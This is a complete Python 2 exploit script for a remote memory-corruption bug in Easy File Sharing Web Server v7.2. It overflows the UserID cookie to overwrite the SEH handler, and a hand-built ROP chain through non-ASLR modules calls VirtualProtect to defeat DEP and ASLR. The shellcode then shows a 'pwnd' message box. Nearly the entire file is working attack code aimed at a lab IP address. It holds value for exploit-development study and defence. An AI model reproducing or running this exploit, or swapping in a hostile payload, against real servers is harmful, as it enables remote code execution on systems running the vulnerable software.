# Easy File Sharing Web Server v7.2 Remote Memory Corruption (SEH, ASLR, and DEP Bypass)
# kernel32!VirtualProtect
# Author Connor McGarr (@330yre)
# https://connormcgarr.github.io
# ROP'd this badboy by hand- sorry mona.
# In muts we trust.
import sys
import os
import socket
import struct

# Payload
# user32!MessageBoxA shellcode
# sqlite3.dll address 0x61c023ac leaks pointer to user32!ECTabTheTextOut+0x2c7
# user32!ECTabTheTextOut+0x2c7 is 0xb2ae bytes away from user32!MessageBoxA
payload = "\xbe\xac\x23\xc0\x61"                # mov esi, 0x61c023ac (pointer to user32!ECTabTheTextOut+0x2c7)
payload += "\x8b\x36"                           # mov esi, dword ptr[esi]
payload += "\xb8\x52\x4d\xff\xff"               # mov eax, 0xffff4d52 (0xffff4d52 = 2's compliment of 0x2c7)
payload += "\x29\xc6"                           # add esi, eax (user32!MessageBoxA loaded into ESI)
payload += "\x31\xc0"                           # xor eax, eax
payload += "\x50"                               # push eax
payload += "\x68\x70\x77\x6e\x64"               # push pwnd
payload += "\x89\xe1"                           # mov ecx, esp
payload += "\x50"                               # push eax
payload += "\x68\x70\x77\x6e\x64"               # push pwnd
payload += "\x89\xe2"                           # mov edx, esp
payload += "\x50"                               # push eax
payload += "\x50"                               # push eax (NULL)
payload += "\x51"                               # push ecx (lpCaption)
payload += "\x52"                               # push edx (lpText)
payload += "\x50"                               # push eax (hWnd)
payload += "\xff\xd6\x90\x90"                   # call esi (user32!MessageBoxA)

# 4059 byte SEH offset
# Stack pivot lands at padding buffer to SEH at offset 2563
crash = "\x90" * 2563
print "[+] Beginning ROP chain. Wish us luck..."

# VirtualAlloc()
# EDI -> (ROP NOP)
# ESI -> VirtualProtect()
# EBP -> Return address (where to jump after execution)
# ESP -> lpAddress (Staring address for permissions change. Filled dynamically with current ESP value)
# EBX -> dwSize (~size of shellcode)
# EDX -> flNewProtect (desired memory page permissions...
# ECX -> lpflOldProtect (inherits old permissions- any writeable address)
# EAX -> NOP

# kernel32!VirtualProtect() -> ESI

# sqlite3.dll, which has doesn't opt into ASLR, leaks a pointer to kernel32!BaseCreateMultiValue+0xd6
# Loading kernel32!VirtualProtect() into ESI
print "[+] Extracting leaked pointer to kernel32!BaseCreateMultiValue+0xd6 from sqlite3.dll..."
crash += struct.pack('<L', 0x10015442)		# pop eax ; ret: ImageLoad.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c022c8)		# pointer to kernel32!BaseCreateMultiValue+0xd6 in sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x1002248c)		# mov eax, dword ptr[eax] ; ret: ImageLoad.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c18d81)		# xchg eax, edi ; ret: sqlite3.dll (non-ASLR module)

# ESI contains 0 at this time. Adding EDI to ESI essentially "moves" EDI into ESI
crash += struct.pack('<L', 0x10021a3e)		# add esi, edi ; ret: ImageLoad.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c373a4)		# pop edi ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0xfff7bf11)		# kernel32!VirtualProtect is 0x840ef bytes away from kernel32!BaseCreateMultiValue+0xd6 (using 2's compliment of 0x840ef to avoid null bytes)
crash += struct.pack('<L', 0x10021a3e)          # add esi, edi ; ret: ImageLoad.dll (non-ASLR module)

# Return address -> EBP

# EBP currently contains an address around the stack. Adding to EBP to point it towards our shellcode location
print "[+] Setting up return address..."
crash += struct.pack('<L', 0x10014a56)		# pop ebx ; ret: ImageLoad.dll (non-ASLR module)
crash += struct.pack('<L', 0xffffee98)		# Shellcode location will be 0x13fc bytes after EBP. Using 2's complement (0xffffec04) to avoid null bytes
crash += struct.pack('<L', 0x1001d78a)		# sub ebp, ebx ; ret: ImageLoad.dll (non-ASLR module)

# lpAddress -> ESP

# This is where kernel32!VirtualProtect() will begin making permissions changes
# Filled dynamically at runtime (we don't need to do anything with this)

# dwSize -> dwSize

# Size of shellcode
# 0x512 -> 1298 total bytes (more than enough)
print "[+] Setting up dwSize parameter..."
crash += struct.pack('<L', 0x10015442)		# pop eax ; ret: ImageLoad.dll (non-ASLR module)
crash += struct.pack('<L', 0xfffffaee)		# 0x512 (1298) negative representation
crash += struct.pack('<L', 0x100231d1)		# neg eax ; ret: ImageLoad.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c62707)		# xchg eax, ebx ; ret 0x1: sqlite3.dll (non-ASLR module)

# flNewProtect -> EDX

# 0x40 = PAGE_EXECUTE_READWRITE
print "[+] Setting up flNewProtect parameter..."
crash += struct.pack('<L', 0x10022c4c)		# xor edx, edx ; ret: ImageLoad.dll (non-ASLR module)
crash += "\x41"					# Compensate for ret 0x1 in the above dwSize ROP gadget
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c09882)          # inc edx ; or cl,cl ; ret: sqlite3.dll (non-ASLR module)

# lpflOldProtect -> ECX

# Any writeable address
print "[+] Setting up lpflOldProtect parameter..."
crash += struct.pack('<L', 0x10018606)		# pop ecx ; ret: ImageLoad.dll (non-ASLR module)
crash += struct.pack('<L', 0x61c73281)		# Writeable address in sqlite3.dll

# Fill EAX with NOPs
crash += struct.pack('<L', 0x10015442)		# pop eax ; ret: ImageLoad.dll (non-ASLR module)
crash += struct.pack('<L', 0x90909090)		# NOPs

# ROP NOP (ret) -> EDI

# Used to return to kernel32!VirtualProtect function call after PUSHAD
crash += struct.pack('<L', 0x100194c0)		# pop edi ; ret: ImageLoad.dll (non-ASLR moduile)
crash += struct.pack('<L', 0x1001f911)		# ret: ImageLoad.dll (non-ASLR module)

# PUSHAD
print "[+] Pushing all kernel32!VirtualProtect parameters to the stack. Wish us luck with the function call..."
crash += struct.pack('<L', 0x100240c2)		# pushad

# Arbitrary number of NOPs for shellcode padding
crash += "\x90" * 64

# Payload
print "[+] Call to kernel32!VirtualProtect is complete!"
crash += payload

# 4063 total offset to SEH
crash += "\x41" * (4063-len(crash))

# SEH only- no nSEH because of DEP
# Stack pivot to return to buffer
crash += struct.pack('<L', 0x10022869)		# add esp, 0x1004 ; ret: ImageLoad.dll (non-ASLR enabled module)

# 5000 total bytes for crash
crash += "\x41" * (5000-len(crash))

# Replicating HTTP request to interact with the server
# UserID contains the vulnerability
http_request = "GET /changeuser.ghp HTTP/1.1\r\n"
http_request += "Host: 172.16.55.140\r\n"
http_request += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\r\n"
http_request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
http_request += "Accept-Language: en-US,en;q=0.5\r\n"
http_request += "Accept-Encoding: gzip, deflate\r\n"
http_request += "Referer: http://172.16.55.140/\r\n"
http_request += "Cookie: SESSIONID=9349; UserID=" + crash + "; PassWD=;\r\n"
http_request += "Connection: Close\r\n"
http_request += "Upgrade-Insecure-Requests: 1\r\n"

print "[+] Sending exploit..."
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.55.140", 80))
s.send(http_request)
s.close()
